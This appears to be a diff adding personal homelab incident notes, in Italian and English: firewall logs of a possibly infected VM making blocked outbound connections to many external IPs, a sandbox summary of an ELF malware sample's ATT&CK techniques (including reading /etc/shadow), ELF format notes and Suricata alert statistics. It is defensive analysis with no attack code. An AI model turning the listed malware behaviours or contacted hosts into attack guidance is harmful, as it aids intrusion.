+112 6 tap112i0-OUT 12/Jan/2024:20:45:16 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=43.155.169.55 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=207 DF PROTO=TCP SPT=34642 DPT=60143 SEQ=2843602757 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:17 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=43.155.169.55 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=208 DF PROTO=TCP SPT=34642 DPT=60143 SEQ=2843602757 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:17 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=47.236.101.172 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=2160 DF PROTO=TCP SPT=47996 DPT=60119 SEQ=4254444133 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:17 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=221.10.124.142 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=29463 DF PROTO=TCP SPT=33174 DPT=60125 SEQ=4103930081 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:19 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=74.208.103.29 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=15201 DF PROTO=TCP SPT=53672 DPT=60116 SEQ=1295328313 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:19 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=119.188.168.145 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=40836 DF PROTO=TCP SPT=60534 DPT=60144 SEQ=1495876413 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:19 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=74.208.103.29 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=15202 DF PROTO=TCP SPT=53672 DPT=60116 SEQ=1295328313 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:22 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=43.156.18.95 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=55082 DF PROTO=TCP SPT=42206 DPT=60145 SEQ=1099810932 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:22 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=27.223.23.61 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=9732 DF PROTO=TCP SPT=41562 DPT=60120 SEQ=1480562931 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:23 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=27.223.23.61 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=9733 DF PROTO=TCP SPT=41562 DPT=60120 SEQ=1480562931 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:23 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=37.237.63.58 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=57216 DF PROTO=TCP SPT=57332 DPT=60129 SEQ=2900518332 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:25 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=190.14.32.94 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=15064 DF PROTO=TCP SPT=49208 DPT=60149 SEQ=1295660665 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:26 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=119.13.88.240 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=30894 DF PROTO=TCP SPT=45900 DPT=60109 SEQ=2627507806 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:27 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=37.237.63.58 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=57218 DF PROTO=TCP SPT=57332 DPT=60129 SEQ=2900518332 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:27 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=43.155.178.38 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=47787 DF PROTO=TCP SPT=49578 DPT=60113 SEQ=4133010368 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:29 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=43.155.178.38 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=47788 DF PROTO=TCP SPT=49578 DPT=60113 SEQ=4133010368 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:31 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=43.134.232.8 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=3786 DF PROTO=TCP SPT=46078 DPT=60125 SEQ=3580628282 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:31 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=43.134.232.8 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=34960 DF PROTO=TCP SPT=46080 DPT=60125 SEQ=2620023203 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:31 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=123.157.79.34 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=33720 DF PROTO=TCP SPT=47886 DPT=60149 SEQ=4199738559 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:33 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=123.157.79.34 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=33721 DF PROTO=TCP SPT=47886 DPT=60149 SEQ=4199738559 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:33 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=37.237.63.58 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=7789 DF PROTO=TCP SPT=35344 DPT=60129 SEQ=1672943633 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:35 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=61.157.177.229 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=64235 DF PROTO=TCP SPT=52454 DPT=60134 SEQ=103960724 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:37 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=61.160.213.239 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=65298 DF PROTO=TCP SPT=50862 DPT=60125 SEQ=4008699848 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:37 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=47.100.3.253 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=7582 DF PROTO=TCP SPT=37058 DPT=60100 SEQ=464562512 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:38 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=47.100.3.253 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=7583 DF PROTO=TCP SPT=37058 DPT=60100 SEQ=464562512 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:39 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=123.157.79.34 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=33723 DF PROTO=TCP SPT=47886 DPT=60149 SEQ=4199738559 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:39 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=8.218.230.152 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=14057 DF PROTO=TCP SPT=44546 DPT=60116 SEQ=2029135611 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:41 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=221.10.124.142 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=2377 DF PROTO=TCP SPT=42542 DPT=60125 SEQ=572999385 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:43 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=61.154.138.107 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=50518 DF PROTO=TCP SPT=33418 DPT=60142 SEQ=1203919396 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:43 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=43.155.169.55 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=10512 DF PROTO=TCP SPT=53278 DPT=60143 SEQ=2047774407 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:44 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=61.154.138.107 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=50519 DF PROTO=TCP SPT=33418 DPT=60142 SEQ=1203919396 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:46 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=185.78.133.230 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=54744 DF PROTO=TCP SPT=51510 DPT=60144 SEQ=3144200026 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:46 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=37.237.205.90 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=59164 DF PROTO=TCP SPT=56134 DPT=60120 SEQ=2156693532 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:47 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=185.78.133.230 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=54745 DF PROTO=TCP SPT=51510 DPT=60144 SEQ=3144200026 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:47 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=43.155.178.38 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=21320 DF PROTO=TCP SPT=50382 DPT=60113 SEQ=2144189172 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:49 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=123.157.79.34 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=51050 DF PROTO=TCP SPT=33816 DPT=60149 SEQ=1733008062 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:50 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=123.157.79.34 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=51051 DF PROTO=TCP SPT=33816 DPT=60149 SEQ=1733008062 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:50 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=43.155.178.38 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=21322 DF PROTO=TCP SPT=50382 DPT=60113 SEQ=2144189172 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:52 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=47.100.3.253 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=55217 DF PROTO=TCP SPT=43592 DPT=60100 SEQ=3661504720 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:52 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=47.100.3.253 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=55218 DF PROTO=TCP SPT=43592 DPT=60100 SEQ=3661504720 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:55 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=43.155.169.55 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=25188 DF PROTO=TCP SPT=42338 DPT=60143 SEQ=2135348703 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:55 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=43.156.18.95 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=13580 DF PROTO=TCP SPT=57518 DPT=60145 SEQ=1208120941 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:55 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=119.13.88.240 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=24379 DF PROTO=TCP SPT=47314 DPT=60109 SEQ=4247488156 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:57 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=119.13.88.240 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=24380 DF PROTO=TCP SPT=47314 DPT=60109 SEQ=4247488156 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:57 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=211.180.219.224 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=61318 DF PROTO=TCP SPT=59608 DPT=60107 SEQ=2104417042 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:59 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=211.180.219.224 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=61319 DF PROTO=TCP SPT=59608 DPT=60107 SEQ=2104417042 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:59 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=33:33:00:00:00:fb:3e:b4:34:35:a7:44:86:dd SRC=2001:b07:ac9:e0df:d335:9412:a442:4bdd DST=ff02::fb LEN=246 TC=0 FLOWLBL=62512 HOPLIMIT=255 PROTO=UDP SPT=5353 DPT=5353 LEN=246
+112 6 tap112i0-OUT 12/Jan/2024:20:45:59 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=33:33:00:00:00:16:3e:b4:34:35:a7:44:86:dd SRC=fe80::7b7:6528:bbef:f5c2 DST=ff02::16 LEN=36 TC=0 FLOWLBL=0 HOPLIMIT=1 NEXTHDR=HOPOPTS PROTO=ICMPV6 TYPE=143 CODE=0 
+112 6 tap112i0-OUT 12/Jan/2024:20:46:00 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=33:33:00:00:00:16:3e:b4:34:35:a7:44:86:dd SRC=fe80::7b7:6528:bbef:f5c2 DST=ff02::16 LEN=36 TC=0 FLOWLBL=0 HOPLIMIT=1 NEXTHDR=HOPOPTS PROTO=ICMPV6 TYPE=143 CODE=0 
+112 6 tap112i0-OUT 12/Jan/2024:20:46:00 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=01:00:5e:00:00:16:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=224.0.0.22 LEN=40 TOS=0x00 PREC=0xC0 TTL=1 ID=0 DF PROTO=IGMP 
+
+#### Hybrid Analisys
+
+- Analisi di hybrid analysis. Tenere presente che non ho fornito l'argument https://www.hybrid-analysis.com/sample/1e2686c1a674630311fdab9b74df54605309076b6d2c3acb4dbc0e7c0080bfa4?environmentId=310
+
+Dall'analisi:
+1. T1106: Adversarie interact with native OS: da verificare
+2. T1027: Obfuscated File or information: section header missing, binary statically linked: verificato ma da rifare per evidences
+3. T1497: Sandbox evasion: da verificare
+4. T1480: Execution Guardrails: da verificare
+5. T1018: Attempt to get a listing  of other systems => reading hosts file: da verificare
+6. T1003.008: Credential Access => reading /etc/shadow: da verificare
+7. T1071: Attempt to communicate => found potential URL in binary/memory: da verificare
+8. T1573: Employ encryption algorith => making HTTPS connections: da verificare
+
+
+#### Tool
+- https://www.joesandbox.com/#windows
+- Usa una vm su homelab senza connessione?
+
+
+### Appunti ELF
+
+ELF made up of:
+1. ELF header
+2. File data
+
+Different file data:
+1. Program header table: describe memory segments
+2. Section header table: describe sections
+3. Data referred to by entries in program/section header table
+
+Program header is used at runtime: it tells the system the size and location of program's memory image (aka segments) (such as code, data, stack).
+Program headers, also known as the program segment headers, provide information about how the segments of the executable file should be loaded into memory during the program’s execution.
+
+
+Section header is used during linking and compiling. It tells systems about ELF file's sections (such as code sections, data sections, symbol tables, relocation info)
+
+Attenzione: sections e segments non sono spazi di memoria SEPARATI. Un segmento può contenere una o più sections ad esempio. Semplicemente sono VISTE diverse dello stesso spazio di memoria. Durante la fase di linking, il loader vede l'eseguibile come sections header e una serie di sections. Durante l'esecuzione, l'eseguibile viene visto come program header ed una serie di segmenti.
+
+
+The Section header table is important during link time to create an executable.
+Common sections
+Text Section (.text): Contains the program's executable instructions.
+Data Section (.data): Stores initialized global and static variables.
+BSS Section (.bss): Reserves space for uninitialized global and static variables.
+Symbol Table Section: Contains symbols (functions, variables) and their associated information.
+
+
+## Statistiche da Wazuh 1.5 ore
+- Articolo riguardo bot che tentano di entrare nella rete https://www.zdnet.com/article/your-website-is-under-constant-attack/ 
+- Suricata categorize malicious or potential malicious traffic into several categories. Some of them seems interesting.
+- Attempted Administrator Privilege Gain. From Suricata it seems to be alerting against CVE_2018_11776. Details here: https://www.keysight.com/blogs/en/tech/nwvs/2022/06/03/strutting-to-remote-code-execution-anatomy-of-cve-2018-11776
+- Attempted User Privilege Gain. Even if detection is different, it seems to have the same aim (la prima appartiene a questo ruleset https://github.com/jpalanco/alienvault-ossim/blob/master/snort-rules-default-open/rules/2.9.2/emerging.rules/emerging-exploit.rules)
+- Non credo che ci sia da guardare altro su Suricata
+
+
